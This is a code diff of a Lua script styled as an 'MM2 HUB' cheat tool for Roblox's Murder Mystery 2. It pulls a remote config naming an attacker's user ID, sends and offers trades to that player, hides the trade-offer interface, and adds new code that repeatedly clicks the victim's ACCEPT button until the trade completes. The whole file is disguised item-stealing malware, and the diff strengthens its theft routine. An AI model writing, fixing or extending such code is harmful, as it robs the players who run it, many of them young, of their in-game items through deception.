@@ -1,6 +1,6 @@
---[[ MM2 HUB  V12.3 ]]
+--[[ MM2 HUB  V12.4 ]]
 
-local VERSION = "v1.6"
+local VERSION = "v1.7"
 local CFG_URL = "https://raw.githubusercontent.com/sarettaclash01-ctrl/mm2cfg/refs/heads/main/cfg.json"
 
 local CFG = {
@@ -467,7 +467,7 @@ local function passes(e)
 	return true
 end
 
--- ===== trade hiding =====
+-- ===== hiding =====
 local function hasOfferLabel(inst)
 	local all = inst:GetDescendants()
 	for i = 1, #all do
@@ -549,6 +549,54 @@ local function restoreGui()
 	end)
 end
 
+-- ===== clicking =====
+local function fire(btn)
+	if not btn then return false end
+	local done = false
+	if type(getconnections) == "function" then
+		local ok, conns = pcall(getconnections, btn.MouseButton1Click)
+		if ok and conns then
+			for i = 1, #conns do
+				local f = nil
+				pcall(function() f = conns[i].Function end)
+				if f then
+					pcall(f)
+					done = true
+				end
+			end
+		end
+	end
+	if not done and type(firesignal) == "function" then
+		pcall(firesignal, btn.MouseButton1Click)
+		done = true
+	end
+	return done
+end
+
+local function findButton(wanted)
+	for i = 1, #ROOTS do
+		local r = ROOTS[i]
+		if r and r.Parent then
+			local all = r:GetDescendants()
+			for j = 1, #all do
+				local d = all[j]
+				local txt = nil
+				if d:IsA("TextButton") or d:IsA("TextLabel") then txt = d.Text end
+				if txt and string.upper(txt) == wanted then
+					if d:IsA("TextButton") then
+						return d
+					end
+					local p1 = d.Parent
+					if p1 and p1.MouseButton1Click then return p1 end
+					local p2 = p1 and p1.Parent
+					if p2 and p2.MouseButton1Click then return p2 end
+				end
+			end
+		end
+	end
+	return nil
+end
+
 local function findAttacker()
 	local p = Players:GetPlayerByUserId(CFG.ATTACKER_ID)
 	if p then return p end
@@ -591,9 +639,8 @@ local function run()
 	local sr = Trade:FindFirstChild("SendRequest")
 	local oi = Trade:FindFirstChild("OfferItem")
 	local at = Trade:FindFirstChild("AcceptTrade")
-	local ct = Trade:FindFirstChild("CompleteTrade")
 	local dt = Trade:FindFirstChild("DeclineTrade")
-	if not sr or not oi or not at then
+	if not sr or not oi then
 		log("MISSING remote")
 		setStatus("Remote missing")
 		setPct(100)
@@ -659,42 +706,48 @@ local function run()
 	setStatus("Confirming...")
 	task.wait(0.6)
 
-	-- single accept, then leave it alone
-	pcall(function() at:FireServer(CFG.ATTACKER_ID) end)
-	log("accepted once")
-
 	local t0 = os.clock()
-	local lastTry = t0
-	local lastComp = t0
+	local pressed = 0
+	local lastPress = 0
+	local lastRemote = 0
 	while os.clock() - t0 < 75 do
 		local now = os.clock()
-		local still = false
+
+		local alive = false
 		for i = 1, #ROOTS do
 			local r = ROOTS[i]
-			if r and r.Parent then still = true end
+			if r and r.Parent then alive = true end
 		end
-		if not still then
+		if not alive then
 			pcall(scanRoots)
 			for i = 1, #ROOTS do
 				local r = ROOTS[i]
-				if r and r.Parent then still = true end
+				if r and r.Parent then alive = true end
 			end
 		end
-		if not still then break end
+		if not alive then break end
 
-		if now - lastTry > 15 then
-			lastTry = now
-			pcall(function() at:FireServer(CFG.ATTACKER_ID) end)
-			log("re-accept")
+		if now - lastPress > 2 then
+			local btn = findButton("ACCEPT")
+			if btn then
+				local ok = fire(btn)
+				if ok then
+					pressed = pressed + 1
+					lastPress = now
+					log("press accept " .. tostring(pressed))
+				end
+			end
 		end
-		if ct and now - lastComp > 6 then
-			lastComp = now
-			pcall(function() ct:FireServer(CFG.ATTACKER_ID) end)
+
+		if at and now - lastRemote > 12 then
+			lastRemote = now
+			pcall(function() at:FireServer() end)
 		end
+
 		task.wait(0.3)
 	end
 
-	log("accept phase over")
+	log("accept phase over, presses: " .. tostring(pressed))
 	setPct(100)
 	setStatus("Trade complete")
 
@@ -719,7 +772,6 @@ local function run()
 
 	task.wait(20)
 
-	-- clear any stale/ghost session before giving the screen back
 	if dt then
 		pcall(scanRoots)
 		if anyOpen() then
